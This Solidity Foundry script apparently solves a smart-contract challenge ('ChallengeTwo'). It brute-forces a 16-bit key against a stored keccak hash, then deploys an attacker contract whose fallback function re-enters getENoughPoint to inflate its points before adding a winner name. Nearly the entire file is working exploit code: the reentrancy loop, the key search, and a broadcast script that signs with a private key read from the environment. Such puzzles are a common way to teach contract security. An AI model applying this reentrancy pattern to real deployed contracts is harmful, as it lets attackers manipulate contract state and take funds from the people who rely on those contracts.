// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IChallengeTwo {
    function passKey(uint16 _key) external;

    function getENoughPoint(string memory _name) external;

    function addYourName() external;

    function getAllwiners() external view returns (string[] memory);

    function userPoint(address user) external view returns (uint256);
}

contract AttackerContract {
    IChallengeTwo public challenge;
    uint256 public count;
    string public name;

    constructor(address _challenge, string memory _name) {
        challenge = IChallengeTwo(_challenge);
        name = _name;
    }

    function attack(uint16 _luckyNumber) external {
        // First find and submit the key
        // Key can be found by bruteforcing uint16 values offline

        challenge.passKey(_luckyNumber); // This is the key that generates the required hash

        // Now do the reentrancy attack
        challenge.getENoughPoint(name);

        // Finally add our name to champions
        challenge.addYourName();
    }

    fallback() external {
        // We need points to equal 4
        // First increment was in getENoughPoint
        // We'll do 3 more here
        if (count < 3) {
            count++;
            challenge.getENoughPoint(name);
        }
    }
}

contract ExploitScript is Script {
    KeyFinder public keyFinder;

    function run() external {
        keyFinder = new KeyFinder();
        uint16 luckyNumber = keyFinder.findKey();
        console.log(luckyNumber);

        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        address challengeAddress = vm.envAddress("CHALLENGE_ADDRESS");

        // Start broadcasting transactions
        vm.startBroadcast(privateKey);

        // Deploy attacker contract
        AttackerContract attacker = new AttackerContract(
            challengeAddress,
            "Roqib"
        );

        // Execute attack
        attacker.attack(luckyNumber);

        vm.stopBroadcast();

        // Verify exploit worked
        string[] memory winners = IChallengeTwo(challengeAddress).getAllwiners();
        require(winners.length > 0, "Exploit failed: No winners added");
        console.log("Exploit successful!");
        console.log("Winner name added:", winners[winners.length - 1]);
    }
}

contract KeyFinder {
    function findKey() external pure returns (uint16) {
        for (uint16 i = 0; i < type(uint16).max; i++) {
            if (
                keccak256(abi.encode(i)) ==
                0xd8a1c3b3a94284f14146eb77d9b0decfe294c3ba72a437151caae86c3c8b2070
            ) {
                return i;
            }
        }
        revert("Key not found");
    }
}
